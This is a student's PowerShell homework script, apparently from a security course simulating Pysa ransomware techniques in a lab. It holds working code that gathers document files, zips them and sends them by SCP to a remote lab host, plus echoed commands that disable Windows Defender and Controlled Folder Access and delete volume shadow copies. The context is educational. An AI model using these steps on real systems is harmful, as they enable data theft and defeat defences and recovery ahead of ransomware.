# By Hasan Hashim
# Task 1
# First we need to create a file called tempdir for zipping
$tempdir = "C:\Users\Hasan Hashim\OneDrive\Desktop\champlain\SYS-320\Week14\homework\temp_zip"

# Create destination for copy
New-Item -ItemType Directory -Path $tempdir

# Here we are getting list of items in Documents and loop through the results
foreach ($f in (Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx, *.txt -Path .\Documents)) {
    Copy-Item -Path $f.FullName -Destination $tempdir
}

# Here we are creatting a zip output called outfile
$outfile = "Task1-exfil.zip"

# Zip the tempdir
Compress-Archive -Update -Path $tempdir -DestinationPath $outfile

# Copy zip file to remote host (ssh host)
Set-SCPItem -ComputerName "192.168.229.135" -Port 22 -Credential (Get-Credential kali) `
    -Path $outfile -Destination "/home/kali/"

# Removing the File after we copyed 
Remove-Item $outfile


# Task 2
<#
1. Find the Powershell cmdlet to disable Windows Defender.  Be sure you use the options to the cmdlet that disables Controlled Folder Access too.

What is Defender Controlled Folder Access?
What behavior of Pysa would cause Controlled Folder Access to trigger? 

2. Find the Powershell cmdlet to delete volume shadow copies and restore points (Do not run this if you have existing Restore points on your personal computer.  You can just echo the cmdlet to the screen).  If you want to test it, then create a few restore points.
Restore points and volume shadow copies are deleted because those contain unencrypted documents that can easily be restored.

#>

Write-Host 'Disabling Windows Defender and Controlled Folder Access:
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -EnableControlledFolderAccess Disabled
'

Write-Host '
Removing restore points and shadow copies:'
# I went to the following link to do delete the shadow copies https://help.datto.com/s/article/KB200554735
Write-Host 'Vssadmin delete shadows /For=[driveletter]: /all'


# Task 3
.\week13.ps1